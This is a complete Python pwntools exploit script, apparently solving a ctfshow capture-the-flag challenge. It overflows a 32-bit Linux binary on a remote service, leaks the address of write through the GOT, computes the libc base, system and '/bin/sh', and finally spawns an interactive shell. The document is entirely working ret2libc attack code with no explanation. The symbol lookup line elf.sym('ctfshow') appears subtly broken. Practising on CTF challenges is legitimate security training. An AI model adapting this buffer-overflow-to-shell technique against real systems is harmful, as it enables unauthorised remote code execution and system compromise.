from pwn import *
context(arch='i386', os='linux', log_level='debug')
elf=ELF('./pwn')
libc=elf.libc
io=remote('127.0.0.1',80)
# 获取PLT地址
write_plt = elf.plt['write']
# 获取GOT地址
write_got = elf.got['write']
ctfshow=elf.sym('ctfshow')
payload=b'a'*140+p32(write_plt)+p32(ctfshow)+p32(1)+p32(write_got)+p32(4)
io.send(payload)

leak_addr=u32(io.recv(4))
log.success(f"write_address:{hex(leak_addr)}")

log.info(f"计算libc")
libc_base=leak_addr-libc.symbols['write']
system_addr=libc_base+libc.symbols['system']
bin_sh_addr=libc_base+next(libc.search(b'/bin/sh'))

log.info(f"Get Shelling...")
payload=b'a'*140+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh_addr)
io.send(payload)
log.success(f"start shelling...")
io.interactive()